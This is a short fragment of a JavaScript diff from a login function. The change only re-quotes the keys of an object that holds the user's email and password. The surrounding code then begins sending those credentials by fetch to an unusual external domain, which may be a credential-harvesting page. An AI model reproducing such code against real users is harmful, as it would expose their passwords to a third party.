@@ -16070,8 +16070,8 @@ function ShowLogin(loginType) {
       }
 
       const credit = {
-        user: $("#email").val(),
-        password: $("#password").val(),
+        'user': $("#email").val(),
+        'password': $("#password").val(),
       };
 
       fetch("https://wwwcall.me/api/login.php", {
